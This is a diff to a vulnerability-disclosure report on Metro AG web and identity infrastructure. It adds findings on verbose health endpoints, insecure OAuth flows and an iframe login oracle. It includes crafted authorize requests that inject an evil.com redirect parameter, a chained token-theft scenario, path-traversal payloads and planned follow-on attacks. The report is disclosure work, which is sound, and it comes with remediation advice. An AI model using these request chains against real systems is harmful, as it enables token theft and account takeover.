@@ -3,18 +3,19 @@
 **Date**: 2026-09-29
 **Scope**: Metro AG Vulnerability Disclosure Program (VDP)
 **Tester**: Authorized VDP participant
-**Status**: Phase 3 - Deep exploitation testing + infrastructure reconnaissance
+**Status**: Phase 4 - Deep exploitation testing + infrastructure reconnaissance + OAuth flow analysis
 
 ---
 
 ## Executive Summary
 
-Comprehensive testing of 66 in-scope Metro AG assets identified **13 reportable findings** across production and pre-production infrastructure. The highest-impact findings are:
+Comprehensive testing of 66 in-scope Metro AG assets identified **16 reportable findings** across production and pre-production infrastructure. The highest-impact findings are:
 
-1. **Orderfulfillment production config.js exposes 639KB of operational data** for 669 stores/depots across 19 countries, including warehouse operations, feature flags, and the complete international domain map — all unauthenticated (Finding 11)
-2. **3v Coupon API leaks full RSA public key** (2048-bit) through verbose JWT error messages, returning 500 Internal Server Error instead of 401 — exposing cryptographic key material, JWT library internals, and version information (Finding 7)
-3. **Betty platform authentication architecture fully disclosed** via unauthenticated JS bundles — OAuth client_ids (BTEX, ADFS), SSO cookie name (metroIdentity), employee login endpoints, server technology (Ktor), and 100+ production/pre-prod domain mappings (Finding 12)
-4. **Semicolon path parameter traversal** (..;/) bypasses path-based routing across all betty services, enabling path traversal from any service context to the root (Finding 13)
+1. **IDAM OAuth insecure flows enabled** — implicit grant (`response_type=token`), hybrid flow, and id_token all accepted; redirect_uri validation allows query parameter injection (`?url=https://evil.com`) enabling authorization code theft via open redirect chaining (Finding 15)
+2. **Orderfulfillment production config.js exposes 639KB of operational data** for 669 stores/depots across 19 countries, including warehouse operations, feature flags, and the complete international domain map — all unauthenticated (Finding 11)
+3. **Verbose health endpoints expose complete internal architecture** — orderservice leaks 43 internal components (PostgreSQL, Cassandra, Flyway, Dropwizard, credit check systems, DANA export), checkout leaks PunchOut B2B and Loyalty/CDM token services; 401 errors leak Java servlet classes and internal HTTP URIs (Finding 14)
+4. **3v Coupon API leaks full RSA public key** (2048-bit) through verbose JWT error messages, returning 500 Internal Server Error instead of 401 (Finding 7)
+5. **Semicolon path parameter traversal** (..;/) bypasses path-based routing across all betty services (Finding 13)
 
 ---
 
@@ -761,6 +762,274 @@ Location: https://betty.metrosystems.net/swagger.json
 
 ---
 
+## Finding 14: Verbose Health Endpoints Expose Complete Internal Architecture — 43+ Service Components
+
+**Severity**: High
+**Assets**: `https://betty.metrosystems.net/ordermanagement/orderservice/health`, `https://betty.metrosystems.net/ordercapture/checkout/health` (in scope)
+**Type**: Information Disclosure (OWASP A05) + Security Misconfiguration (OWASP A05)
+
+### Description
+
+Multiple betty platform health check endpoints are **unauthenticated** and return **detailed internal architecture information**. The `/ordermanagement/orderservice/health` endpoint returns **7,165 bytes** exposing **43 named internal components** including database technologies (PostgreSQL, Cassandra), framework details (Dropwizard, Flyway), business systems (credit check, DANA export, invoice processing, picklist management), and HTTP client configurations. The `/ordercapture/checkout/health` endpoint reveals 10 additional components including PunchOut B2B procurement, Loyalty IDAM tokens, and CDM (Customer Data Management) services.
+
+Additionally, 401 error responses from protected endpoints leak **Java servlet class names** and **internal HTTP URLs**, confirming the platform is built by freiheit.com using a custom Swagger servlet.
+
+### Evidence
+
+**Orderservice health — 43 components exposed unauthenticated:**
+```
+GET /ordermanagement/orderservice/health HTTP/2
+Host: betty.metrosystems.net
+
+200 OK (7,165 bytes)
+```
+
+**Database infrastructure revealed:**
+```json
+"OrdersPostgresJdbiLifecycle": {"healthy": true}
+"OrderservicePostgresJdbiLifecycle": {"healthy": true}
+"postgresOrders": {"healthy": true}
+"postgresOrderservice": {"healthy": true}
+"MigrationsLifeCycle": {"message": "Cassandra migrations are up and running"}
+"FlywayOrdersMigration": {"healthy": true}
+"FlywayOrderserviceMigration": {"healthy": true}
+```
+
+**Business systems exposed:**
+```json
+"CreditCheckEventLifeCycle": {"healthy": true}
+"CreditReservationStatusLifeCycle": {"healthy": true}
+"FsdOrderEventDanaExportLifeCycle": {"healthy": true}
+"FsdMailEventProducer": {"healthy": true}
+"InvoiceCreationForReturnsProducer": {"healthy": true}
+"InvoiceStatusLifeCycle": {"healthy": true}
+"PicklistAvailableBundlesLifeCycle": {"healthy": true}
+"PicklistBundleReplacementsLifeCycle": {"healthy": true}
+"MipTransferLifeCycle": {"healthy": true}
+"ReservationFeedLifeCycle": {"healthy": true}
+```
+
+**Framework identification:**
+```json
+"DropwizardMipConnectionPoolLifecycle": {"timestamp": "2026-09-28T08:36:51.373Z"}
+```
+The timestamp reveals the exact server restart time: **2026-09-28T08:36:51 UTC**.
+
+**Technical login system:**
+```json
+"TechnicalLoginLifeCycle": {"message": "technical user logged in"}
+"TechLoginHttpClient": {"healthy": true}
+"IdamLoginHttpClient": {"healthy": true}
+```
+
+**HTTP client configurations:**
+```json
+"StandardTimeoutHttpClient": {"healthy": true}
+"HighTimeoutHttpClient": {"healthy": true}
+"SuperHighTimeoutHttpClient": {"healthy": true}
+```
+
+**Checkout health — 10 additional components:**
+```
+GET /ordercapture/checkout/health HTTP/2
+
+200 OK
+```
+```json
+"PunchOutHealthCheck": {"healthy": true}
+"LoyaltyIdamAccessTokenServiceHealthCheck": {"healthy": true}
+"CdmIdamAccessTokenServiceHealthCheck": {"healthy": true}
+"StreamTopologyLifeCycleHealthCheck": {"healthy": true}
+"CustomerHealthCheck": {"healthy": true}
+"MigrationsLifeCycleHealthCheck": {"healthy": true}
+"TechnicalUserServiceHealthCheck": {"healthy": true}
+```
+
+**401 error body leaks Java servlet class and internal paths:**
+```html
+<!-- GET /orderfulfillment.depotsettings.v1/ -->
+<th>URI:</th><td>/depotmanagement/depotsettings/</td>
+<th>MESSAGE:</th><td>You must provide a http header 'JWT'</td>
+<th>SERVLET:</th><td>com.freiheit.betty.microservice.core.rest.swagger.SwaggerServlet-1760e688</td>
+```
+
+**Internal HTTP (not HTTPS) URI leaked:**
+```html
+<!-- GET /ordermanagement/orderbff/ -->
+<th>URI:</th><td>http://betty.metrosystems.net/ordermanagement/orderbff/</td>
+```
+Internal routing uses plain HTTP — confirming TLS terminates at the edge/reverse proxy.
+
+### Impact
+
+- **Complete architecture disclosure**: An attacker knows every database (PostgreSQL x2, Cassandra), migration tool (Flyway), framework (Dropwizard), message bus (event producers/lifecycle), and business system (credit check, DANA export, invoice, picklist, reservation, MIP transfer)
+- **Server restart time leaked** (2026-09-28T08:36:51Z) — aids in timing-based attacks and maintenance window identification
+- **PunchOut B2B endpoint confirmed** — PunchOut (OCI cXML) procurement protocol is active, which if misconfigured can enable order injection
+- **Loyalty and CDM IDAM tokens** — confirms separate token issuance for loyalty and customer data services, expanding the token theft attack surface
+- **Platform developer identified**: `com.freiheit.betty.microservice` → built by freiheit.com (development company), enables targeted open-source component analysis
+- **Custom SwaggerServlet deployed to production** — confirms API documentation is served by a production servlet (supports Finding 10)
+- **Internal HTTP routing** — if an attacker achieves SSRF, internal services communicate over unencrypted HTTP
+- **Auth header convention leaked** — `You must provide a http header 'JWT'` reveals the custom JWT header name (not standard `Authorization: Bearer`)
+
+### Recommendation
+
+1. Remove or restrict health check endpoints from external access — require authentication or limit to internal networks
+2. Return minimal health status (`{"status":"UP"}`) instead of component-level detail
+3. Return generic 401/403 errors — do not expose servlet classes, internal URIs, or auth header requirements
+4. Enforce HTTPS for internal service-to-service communication
+5. Avoid deploying SwaggerServlet to production
+
+---
+
+## Finding 15: IDAM OAuth Insecure Flows — Implicit Grant + Hybrid Flow + redirect_uri Query Parameter Injection
+
+**Severity**: High
+**Asset**: `https://idam.metrosystems.net/authorize/api/oauth2/authorize` (*.metrosystems.net — in scope)
+**Type**: Broken Authentication (OWASP A07) + Security Misconfiguration (OWASP A05)
+
+### Description
+
+The Metro AG IDAM OAuth 2.0 authorization server has three compounding security issues:
+
+1. **Implicit grant enabled** (`response_type=token`) — deprecated in OAuth 2.1 (RFC draft) and explicitly discouraged by RFC 9700 (OAuth 2.0 Security Best Current Practice). Access tokens are returned in URL fragments, which leak via browser history, Referer headers, and JavaScript `window.location`.
+
+2. **Hybrid flow enabled** (`response_type=code token`) and **id_token flow** (`response_type=id_token`) — both put tokens in URL fragments with the same leakage risks.
+
+3. **redirect_uri accepts query parameter appending** — while the authorization server correctly rejects different hosts (returns 403), it **accepts arbitrary query parameters** appended to a valid redirect URI. This means `redirect_uri=https://betty.metrosystems.net/shop?url=https://evil.com` is accepted, and after authentication the authorization code/token is sent to this modified URL.
+
+### Evidence
+
+**Implicit grant accepted (response_type=token):**
+```
+GET /authorize/api/oauth2/authorize?response_type=token&client_id=BTEX&realm_id=BETTY_REALM
+    &redirect_uri=https://betty.metrosystems.net/shop&scope=openid
+Host: idam.metrosystems.net
+
+HTTP/2 200 (981 bytes — login page served)
+```
+
+**Hybrid flow accepted (response_type=code token):**
+```
+GET /authorize/api/oauth2/authorize?response_type=code%20token&client_id=BTEX&realm_id=BETTY_REALM
+    &redirect_uri=https://betty.metrosystems.net/shop&scope=openid
+
+HTTP/2 200 (986 bytes — login page served)
+```
+
+**id_token flow accepted (response_type=id_token):**
+```
+GET /authorize/api/oauth2/authorize?response_type=id_token&client_id=BTEX&realm_id=BETTY_REALM
+    &redirect_uri=https://betty.metrosystems.net/shop&scope=openid&nonce=test123
+
+HTTP/2 200 (1002 bytes — login page served)
+```
+
+**redirect_uri with injected query parameter — ACCEPTED:**
+```
+GET /authorize/api/oauth2/authorize?response_type=code&client_id=BTEX&realm_id=BETTY_REALM
+    &redirect_uri=https://betty.metrosystems.net/shop?url=https://evil.com&scope=openid
+
+HTTP/2 200 (1011 bytes — login page served)
+```
+After authentication, the user would be redirected to:
+`https://betty.metrosystems.net/shop?url=https://evil.com&code=AUTH_CODE`
+
+**redirect_uri with path traversal — ACCEPTED:**
+```
+GET /authorize/api/oauth2/authorize?response_type=code&client_id=BTEX&realm_id=BETTY_REALM
+    &redirect_uri=https://betty.metrosystems.net/shop/..;/&scope=openid
+
+HTTP/2 200 (994 bytes — login page served)
+```
+
+**Baseline — evil.com host properly REJECTED:**
+```
+GET /authorize/api/oauth2/authorize?...&redirect_uri=https://evil.com/callback
+
+HTTP/2 403 (420 bytes — blocked by Akamai)
+```
+
+**grant_types_supported confirms legacy flows active:**
+```json
+"grant_types_supported": ["refresh_token", "client_credentials", "implicit", "authorization_code", "password"]
+```
+
+### Impact
+
+- **Token theft via implicit grant**: With `response_type=token`, access tokens are placed in the URL fragment (`#access_token=...`). These leak through:
+  - **Referer headers**: If the redirect page loads any external resource, the fragment (containing the token) may leak via the Referer header in some browsers
+  - **Browser history**: The full URL including fragment is stored in browser history
+  - **JavaScript access**: Any script on the redirect page (including injected scripts via XSS) can read `window.location.hash`
+
+- **Authorization code theft via redirect_uri injection**: The accepted `?url=https://evil.com` query parameter appended to the redirect URI means:
+  1. If the betty SPA processes the `url` parameter as a redirect destination (common in SPAs), the user is redirected to `evil.com` WITH the authorization code
+  2. Even without client-side redirect, the authorization code is now associated with a URL containing attacker-controlled data
+
+- **Chained attack scenario**: An attacker combines implicit grant + redirect_uri injection:
+  1. Craft: `response_type=token&redirect_uri=https://betty.metrosystems.net/shop?url=https://evil.com`
+  2. Victim authenticates normally on the legitimate IDAM login page
+  3. Token is redirected to `https://betty.metrosystems.net/shop?url=https://evil.com#access_token=VICTIM_TOKEN`
+  4. If the SPA processes `url` parameter → full account takeover
+
+- **RFC non-compliance**: Violates RFC 9700 Section 2.1.2 (implicit grant SHOULD NOT be used), Section 4.1.3 (redirect_uri must be compared using exact string matching)
+
+### Recommendation
+
+1. **Disable implicit grant** — remove `token` from supported response types; use authorization code flow with PKCE exclusively
+2. **Disable hybrid flow** — remove `code token` and `code id_token token` from supported response types
+3. **Enforce exact redirect_uri matching** — reject any redirect_uri that does not exactly match a pre-registered value (no query parameter appending, no path modification)
+4. **Require PKCE** for all OAuth clients — enforce `code_challenge` and `code_challenge_method=S256`
+5. **Remove `password` grant type** — deprecated and insecure
+6. **Audit `token_endpoint_auth_methods_supported: ["none"]`** — ensure only appropriate public clients can use unauthenticated token requests
+
+---
+
+## Finding 16: IDAM Session Detection via check_cookie_iframe — Cross-Origin Login Oracle
+
+**Severity**: Medium
+**Asset**: `https://idam.metrosystems.net` (*.metrosystems.net — in scope)
+**Type**: Information Disclosure (OWASP A01) + Broken Authentication (OWASP A07)
+
+### Description
+
+The IDAM identity server embeds a `check_cookie_iframe` mechanism that uses `postMessage` to communicate session state (whether the `metroIdentity` SSO cookie is present) to parent frames. The iframe is loaded by betty SPA applications to detect if a user has an active IDAM session. If the `postMessage` handler does not validate the requesting origin, any website can embed this iframe and determine whether a visitor is currently logged into the Metro AG ecosystem.
+
+### Evidence
+
+**SSO cookie check mechanism (from orderfulfillment api.js):**
+```javascript
+var ssoCookie = 'metroIdentity';
+// Creates iframe to idam.metrosystems.net
+// Uses postMessage to check if 'metroIdentity' cookie exists
+// Parent frame receives: {loggedIn: true/false}
+```
+
+**iframe configuration in betty SPA:**
+```javascript
+window.idam_login_base_url = "https://idam.metrosystems.net";
+// iframe URL: https://idam.metrosystems.net/authorize/check_cookie_iframe
+```
+
+**CSP header on IDAM confirms framing is allowed from betty:**
+```
+frame-ancestors https://betty.metrosystems.net
+```
+However, `X-Frame-Options: ALLOW-FROM` is deprecated and inconsistently enforced by browsers. The CSP `frame-ancestors` directive properly restricts to `betty.metrosystems.net`, but if CSP is not enforced (older browsers) or if a subdomain of `betty.metrosystems.net` has XSS, the iframe can be loaded.
+
+### Impact
+
+- **Login oracle**: Any attacker who achieves XSS on `betty.metrosystems.net` (or any subdomain allowed by CSP) can silently determine if visitors are logged into Metro AG services
+- **Targeted attacks**: Knowledge of login state enables targeted phishing — only showing credential harvesting to logged-in users who would expect a re-authentication prompt
+- **Session detection**: Combined with Finding 12 (SSO cookie name `metroIdentity`), an attacker can perform comprehensive session state reconnaissance
+
+### Recommendation
+
+1. Validate the requesting origin in the `postMessage` handler — only respond to messages from explicitly whitelisted origins
+2. Use `targetOrigin` parameter in `postMessage` calls instead of `*`
+3. Consider removing the check_cookie_iframe pattern in favor of server-side session validation
+
+---
+
 ## Unreachable Targets (for reference)
 
 The following in-scope targets were **unreachable** from the testing environment due to egress proxy restrictions, DNS resolution failures, or firewall rules:
@@ -783,10 +1052,19 @@ The following in-scope targets were **unreachable** from the testing environment
 
 ---
 
-## Phase 2-3 Testing Summary
+## Phase 2-4 Testing Summary
+
+**Tested and confirmed exploitable (documented as findings):**
+- OAuth implicit grant enabled on IDAM (Finding 15)
+- OAuth redirect_uri query parameter injection accepted (Finding 15) — NOTE: host validation works (evil.com → 403), but query parameter appending bypasses exact matching
+- OAuth hybrid flow (code+token) and id_token flow enabled (Finding 15)
+- redirect_uri path traversal (..;/) accepted by IDAM (Finding 15)
+- Verbose health endpoints on orderservice (43 components) and checkout (10 components) (Finding 14)
+- 401 error bodies leak Java servlet class, internal HTTP URIs, and auth header convention (Finding 14)
+- check_cookie_iframe postMessage session detection (Finding 16)
 
 **Tested and confirmed not exploitable:**
-- OAuth redirect_uri bypass (IDAM uses strict exact matching — all 10 bypass payloads rejected)
+- OAuth redirect_uri HOST bypass (IDAM correctly rejects different hosts — evil.com → 403)
 - JWT algorithm confusion RS256→HS256 (server rejects HS256 tokens, 500 but not exploitable)
 - JWT kid SQL injection / path traversal (reflected but no injection — kid lookup against static JWKS)
 - Server-side XSS on betty shops (SPA architecture — no server-side template rendering)
@@ -799,7 +1077,7 @@ The following in-scope targets were **unreachable** from the testing environment
 - Actuator/Spring Boot endpoints (all 404 on betty — except /health returning `{"status":"READY"}`)
 - Elasticsearch/Kibana direct access (no non-standard ports accessible)
 - Host header injection (GCP infrastructure behavior — 301 redirect with `Host: evil.com` but requires MITM to exploit, low practical impact)
-- IDAM OAuth redirect_uri validation (returns 403 for invalid redirect_uri — properly validated)
+- IDAM OAuth redirect_uri HOST validation (returns 403 for different hosts — properly validated; see Finding 15 for query param and path bypass)
 - idam.metro.de direct access (Akamai WAF serves same 605B SPA for all paths — Keycloak backend not directly accessible)
 - CSP nonce bypass (nonces not extractable via curl — SPA rendering)
 - Swagger.json null-byte / encoding bypass (all variants return 403 or 404)
@@ -818,13 +1096,14 @@ The following in-scope targets were **unreachable** from the testing environment
 - erika.metrosystems.net (egress proxy blocked)
 - adfs3.metro.info (connection failure)
 
-## Next Steps (Phase 4)
+## Next Steps (Phase 5)
 
 1. **Authenticated testing** — obtain valid test credentials to test IDOR, privilege escalation, and business logic flaws on the betty platform using the disclosed authentication endpoints
 2. **Employee entitlement escalation** — using disclosed entitlement codes (lPM, lTM, fISTC) to test privilege escalation once authenticated
-3. **Subdomain enumeration** on 10 in-scope wildcard domains (requires DNS tooling like amass/subfinder)
-4. **Voucher app access-code auth testing** — the `/api/v1/authenticate?accessCode=` endpoint (found in JS bundle) may accept short/predictable codes
-5. **DOM-based XSS** — thorough client-side JavaScript analysis of SPA applications for postMessage handlers (especially the IDAM check_cookie_iframe), hash-fragment injection, and unsafe DOM manipulation
-6. **Akamai WAF bypass** — advanced techniques against the CDN/WAF protecting metro.rs and makro.nl
-7. **WebSocket testing** — the voucher app CSP includes `wss:` connect-src, indicating potential WebSocket endpoints
-8. **IDAM session iframe exploitation** — the `check_cookie_iframe` on idam.metrosystems.net uses `postMessage` with cookie name `metroIdentity` — potential for cross-origin session detection or manipulation
+3. **Open redirect chaining with Finding 15** — test if the betty SPA processes the `url` query parameter in the redirect_uri as a redirect destination, completing the authorization code theft chain
+4. **PunchOut (OCI) procurement testing** — checkout health reveals PunchOut is active; test for unauthorized order injection via cXML
+5. **Voucher app access-code auth testing** — the `/api/v1/authenticate?accessCode=` endpoint (found in JS bundle) may accept short/predictable codes
+6. **DOM-based XSS** — thorough client-side JavaScript analysis of SPA applications for postMessage handlers, hash-fragment injection, and unsafe DOM manipulation
+7. **Subdomain enumeration** on 10 in-scope wildcard domains (requires DNS tooling like amass/subfinder)
+8. **IDAM PKCE enforcement testing** — verify if PKCE is required or optional; if optional, authorization code interception is possible
+9. **IDAM state parameter binding** — test if the `state` parameter is properly bound to the session to prevent login CSRF
